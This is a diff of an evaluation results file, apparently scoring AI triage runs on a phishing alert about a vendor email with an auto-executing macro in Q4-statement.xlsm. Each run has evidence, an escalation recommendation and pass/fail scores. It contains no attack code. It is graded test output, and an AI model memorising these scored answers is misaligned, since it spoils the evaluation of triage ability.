+            "summary": "A macro-enabled Excel file (.xlsm) with an auto-executing macro arrived from a known vendor domain. The known sender is a benign signal, but auto-exec macros in a financial-statement attachment are a common malware delivery method, and a compromised vendor account cannot be ruled out. Escalate for attachment analysis and sender verification before any user opens it.",
+            "evidence": [
+              {
+                "field": "sender_domain_known",
+                "value": "true",
+                "why": "The sender domain is a known vendor, which points to legitimate business email and lowers the likelihood of a spoofed or random sender."
+              },
+              {
+                "field": "sender",
+                "value": "accounts@vendor.example.com",
+                "why": "An accounts mailbox sending a quarterly statement is plausible business activity, but vendor mailboxes are often compromised and abused to send malware."
+              },
+              {
+                "field": "attachment_has_macro",
+                "value": "true",
+                "why": "The attachment contains a macro; macro-enabled Office files are a frequent initial-access vector and unusual for a plain statement."
+              },
+              {
+                "field": "macro_autoexec",
+                "value": "true",
+                "why": "The macro runs automatically when the document is opened, which is a strong malicious indicator because it needs little user interaction beyond enabling content."
+              },
+              {
+                "field": "attachment",
+                "value": "Q4-statement.xlsm",
+                "why": "A financial-statement lure using a macro-enabled extension fits common phishing patterns, though some vendors do send legitimate macro-based statements."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Quarantine the email if still unopened, and detonate Q4-statement.xlsm in a sandbox to inspect the autoexec macro. Contact the vendor through a known out-of-band channel to confirm they sent it. Check whether any recipient opened the file or enabled macros, and if so, review those endpoints for suspicious process activity."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": false,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "needs_investigation",
+            "confidence": "low",
+            "summary": "An email from a known vendor domain carries a macro-enabled Excel file (Q4-statement.xlsm) whose macro runs automatically on open. The known sender suggests normal business traffic, but auto-executing macros are a common malware delivery method and a vendor account could be compromised. The signals conflict and the alert has no content or reputation data to settle it, so the attachment needs analysis before anyone opens it.",
+            "evidence": [
+              {
+                "field": "sender_domain_known",
+                "value": "true",
+                "why": "The sender domain is a known vendor, which points toward legitimate business correspondence such as a quarterly statement."
+              },
+              {
+                "field": "sender",
+                "value": "accounts@vendor.example.com",
+                "why": "An accounts mailbox sending a statement fits normal vendor behavior, but the alert does not confirm the account is uncompromised or that the message passed SPF/DKIM/DMARC."
+              },
+              {
+                "field": "attachment_has_macro",
+                "value": "true",
+                "why": "A macro-enabled .xlsm file is an unusual format for a statement and is a common malware delivery vector."
+              },
+              {
+                "field": "macro_autoexec",
+                "value": "true",
+                "why": "The macro is set to run automatically when the document is opened, which is a strong malicious indicator and raises risk even from a trusted sender."
+              },
+              {
+                "field": "attachment",
+                "value": "Q4-statement.xlsm",
+                "why": "The filename looks like routine finance correspondence, which is a typical lure theme in compromised-vendor or business email compromise attacks."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2/malware analysis. Hold or quarantine the email if still undelivered. Detonate the attachment in a sandbox and review the macro code. Check email authentication results (SPF/DKIM/DMARC) and sender headers. Confirm with the vendor through a known out-of-band contact that they sent it. Check whether any recipient has already opened the file and, if so, review that endpoint for suspicious process activity."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Confidence is low",
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": false,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    }
+  ]
+}
